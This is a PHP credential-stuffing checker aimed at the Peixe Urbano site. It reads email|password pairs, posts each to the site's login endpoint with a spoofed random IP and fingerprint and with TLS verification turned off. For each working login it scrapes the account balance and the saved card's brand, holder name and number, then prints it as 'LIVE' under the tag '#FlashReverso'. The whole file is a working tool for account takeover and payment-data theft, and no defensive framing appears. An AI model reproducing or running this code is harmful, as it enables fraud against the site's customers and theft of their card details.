<?php

error_reporting(0);

set_time_limit(0);



class cURL {



    var $callback = false;



    function setCallback($func_name) {

        $this->callback = $func_name;

    }



    function doRequest($method, $url, $vars) {

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);

        curl_setopt($ch, CURLOPT_HEADER, 0);

        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');

        if ($method == 'POST') {

            curl_setopt($ch, CURLOPT_POST, 1);

            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);

        }

        $data = curl_exec($ch);

        curl_close($ch);



        if ($data) {

            if ($this->callback) {

                $callback = $this->callback;

                $this->callback = false;

                return call_user_func($callback, $data);

            } else {

                return $data;

            }

        } else {

            return curl_error($ch);

        }

    }



    function get($url) {

        return $this->doRequest('GET', $url, 'NULL');

    }



    function post($url, $vars) {

        return $this->doRequest('POST', $url, $vars);

    }



}



function GetStr($string, $start, $end) {

    $str = explode($start, $string);

    $str = explode($end, $str[1]);

    return $str[0];

}



$listass = explode("\r\n", $_POST['list']);

$listin = count($listass) * 2;





flush();

ob_flush();

$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

if (!empty($senha)) {

    $nums = '0123456789';



    $ip = mt_rand(111, 999) . '.';

    $ip .= mt_rand(111, 999) . '.';

    $ip .= mt_rand(111, 999) . '.';

    $ip .= mt_rand(111, 999);

    $fingerprint = sha1(uniqid());

    if (file_exists('cookie.txt')) {

        unlink('cookie.txt');

    }

    $a = new cURL;

    $b = $a->post('https://account.peixeurbano.com.br/login', 'retURL=https://www.peixeurbano.com.br/Conta/Creditos&email=' . $email . '&password=' . $senha . '&ip=' . $ip . '&client_id=6&fingerprint=' . $fingerprint . '&user_agent=' . $_SERVER['REMOTE_ADDR'] . '&platform=Win32');

    $b = utf8_encode($b);



    if (strpos($b, '<span id="total-credit-1" class="ST-value">')) {

        $credito = GetStr($b, '<span id="total-credit-1" class="ST-value">', '</span>');

        $c = $a->get('https://www.peixeurbano.com.br/Conta/CartaoCredito');

        $c = utf8_encode($c);

        if (strpos($c, '<td class="cc-brand">')) {

            $cc = GetStr($c, '<td class="cc-brand">', '</td>');

            $ccname = GetStr($c, '<td class="cc-holder-name">', '</td>');

            $creditso = GetStr($c, '<td class="cc-number">', '</td>');

            if ($cc == 'VISA'){

                $cc = ' Visa';

            } else if ($cc == 'MasterCard'){

             $cc = ' MasterCard';

         } else if ($cc == 'AMEX'){

             $cc = ' Amex';

         } else if ($cc = 'Amex'){

            $cc = ' Amex';

         } else {

            $cc = $cc;

         }           

     } else {

        $cc = ' Cartao: Sem Cartao';

    }

    echo "LIVE → $email|$senha | Nome: $ccname | Saldo : $credito | Bandeira: $cc | Cartão: $creditso #FlashReverso";

    flush();

    ob_flush();

} else {

    echo "DIE → $email|$senha";

    flush();

    ob_flush();

}

} else {

 echo "DIE → $email|$senha";

}

?>

